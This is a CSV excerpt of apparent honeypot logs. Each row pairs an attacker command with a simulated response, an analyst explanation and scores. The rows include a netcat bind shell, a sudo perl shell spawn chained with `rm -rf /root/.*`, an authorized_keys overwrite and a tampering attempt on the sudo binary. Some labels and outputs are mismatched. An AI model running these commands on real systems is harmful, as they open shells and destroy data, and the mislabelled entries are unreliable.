+hybrid,HYB-007-7325A4,Defense Evasion,1,`echo > /tmp/.ssh/authorized_keys`,Permission denied,"The attacker attempted to overwrite the authorized_keys file, which is used for SSH key authentication. This action could be part of a credential theft or privilege escalation attempt.",3,2
+hybrid,HYB-027-22938F,Exfiltration,4,`nc -lvp 8080 -e /bin/bash`,nc: command not found,"Attacker attempted to execute a shell command via nc, but it was unsuccessful due to the honeypot's response.",3,2
+hybrid,HYB-016-51EED1,Resource Development,20,"`sudo echo ""lolbin"" > /tmp/LOLBIN.txt`",,"The attacker is attempting to create a file named 'LOLBIN.txt' in the `/tmp` directory, which could be used for further malicious activity.",3,5
+hybrid,HYB-018-F5E597,Execution,3,"`sudo ./python3 -c 'import os; os.system(""echo Hello, World! > /tmp/output.txt"")'`","Sorry, try again.
+Sorry, try again.
+Sorry, try again.
+www-data@ubuntu:~$ sudo ./python3 -c 'import os; os.system(""echo Hello, World! > /tmp/output.txt"")'
+password for www-data: Permission denied","The attacker is attempting to execute a Python script that will write 'Hello, World!' to a file in the `/tmp` directory.",5,5
+hybrid,HYB-027-22938F,Exfiltration,2,"`cat /var/log/syslog | grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'`","192.168.1.1
+10.0.0.5
+172.16.0.1",The attacker is attempting to gather IP addresses from a system's log files.,5,5
+hybrid,HYB-005-BADD8D,Persistence,14,chown root:root /usr/bin/sudo,chown: changing ownership of '/usr/bin/sudo': Operation not permitted,"The attacker attempted to change the ownership of the sudo binary, which is typically restricted for security reasons.",5,5
+hybrid,HYB-024-9EFD45,Lateral Movement,9,`sudo umount /tmp && sudo mount --bind /tmp /var/run/pwned`,"Sorry, try again.
+Sorry, try again.
+Sorry, try again.
+www-data@ubuntu:~$ sudo umount /tmp && sudo mount --bind /tmp /var/run/pwned
+[sudo] password for www-data: Permission denied",The attacker is attempting to gain root access by mounting a bind mount to `/var/run/pwned` which could potentially allow them to execute arbitrary commands.,3,2
+hybrid,HYB-002-9EC054,Resource Development,2,`chmod +x LOLBIN.sh`,,The attacker is attempting to execute a potentially malicious script named 'LOLBIN.sh' by changing its permissions to executable.,3,2
+hybrid,HYB-015-0E1864,Reconnaissance,1,lsblk,"NAME        MAJ:MIN RM   SIZE RO TYPE MOUNTPOINT
+sda           8:0    0 931.5G  0 disk 
+├─sda1        8:1    0   732M  0 part /boot/efi
+├─sda2        8:2    0     1K  0 part 
+└─sda3        8:3    0 930.8G  0 part 
+  ├─vg0-root 253:0    0 465.4G  0 lvm  /
+  └─vg0-swap 253:1    0 265.2G  0 lvm  [SWAP]
+sdb           8:16   0 931.5G  0 disk 
+└─sdb1        8:17   0 931.5G  0 part /mnt/backup",The attacker is attempting to enumerate available storage devices and partitions on the honeypot system.,5,5
+hybrid,HYB-022-F5E230,Credential Access,21,`ssh-keygen -t rsa -f /tmp/ssh-abcde/keypair`,"Generating public/private rsa key pair.
+Enter file in which to save the key (/tmp/ssh-abcde/keypair): Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /tmp/ssh-abcde/keypair. Your public key has been saved in /tmp/ssh-abcde/keypair.pub. The key fingerprint is:
+SHA256:abcdef1234567890 user@example.com The key's randomart image is:
++---[RSA 2048]----+
+|                 |
+|                 |
+|                 |
+|                 |
+|                 |
+|                 |
+|                 |
+|                 |
+|                 |
++----[SHA256]-----+",Attacker is attempting to generate a public/private SSH key pair for potential use in unauthorized access.,5,5
+hybrid,HYB-020-73ED4F,Privilege Escalation,22,"sudo perl -e 'exec ""/bin/sh""' && sudo rm -rf /root/.*","# sudo perl -e 'exec ""/bin/sh""'
+Sorry, try again.
+sudo: 1 incorrect password attempt
+# sudo rm -rf /root/*
+rm: cannot remove '/root/.bash_logout': Permission denied
+rm: cannot remove '/root/.profile': Permission denied
+rm: cannot remove '/root/.bashrc': Permission denied
+rm: cannot remove '/root/.ssh': Permission denied
+rm: cannot remove '/root/.*': Permission denied
+#",Attacker is attempting to gain root access and delete all files in the `/root` directory.,3,2
